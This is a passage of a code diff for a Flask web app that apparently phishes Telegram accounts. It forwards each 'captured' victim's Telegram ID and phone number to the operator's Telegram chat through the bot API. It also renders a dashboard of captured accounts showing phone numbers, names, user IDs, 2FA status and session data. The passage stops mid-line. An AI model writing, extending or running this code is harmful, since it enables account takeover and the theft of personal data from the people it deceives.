+    logger.info(f"Contact saved: {phone} | TG: {tg_id}")
+
+    try:
+        http_requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={
+                'chat_id': YOUR_TELEGRAM_ID,
+                'text': f"Contact Captured\nTG ID: `{tg_id}`\nPhone: `{phone}`",
+                'parse_mode': 'Markdown'
+            },
+            timeout=10
+        )
+    except Exception:
+        pass
+
+    return jsonify({'success': True, 'phone': phone})
 
 
 @app.route('/api/share', methods=['POST'])
@@ -750,32 +857,4 @@ def dash():
         tag = "2FA" if a.get('has_2fa') else ""
         rows += (
             f"<tr><td>{i}</td>"
-            f"<td>{a['phone']}</td>"
-            f"<td>{a.get('first_name','')} {a.get('last_name','')}</td>"
-            f"<td>@{a.get('username','-')}</td>"
-            f"<td>{a.get('user_id','')}</td>"
-            f"<td>{a.get('dc','')}</td>"
-            f"<td>{tag} ({ss_len})</td>"
-            f"<td>{a.get('time','')}</td></tr>"
-        )
-    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
-    return (
-        "<!DOCTYPE html><html><head><title>Dashboard</title>"
-        "<style>body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
-        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
-        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
-        "th{background:#141420;color:#ddd}tr:hover{background:#141420}</style></head>"
-        f"<body><h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
-        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th>"
-        "<th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead><tbody>"
-        f"{rows if rows else '<tr><td colspan=8 style=text-align:center;color:#666;padding:30px>No accounts</td></tr>'}"
-        "</tbody></table>"
-        "<script>setTimeout(function(){location.reload()},10000)</script>"
-        "</body></html>"
-    )
-
-
-if __name__ == '__main__':
-    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
-        logger.warning("Some env vars missing!")
-    app.run(host='0.0.0.0', port=PORT, debug=False)
+            f"<td>{a['phone']}</td
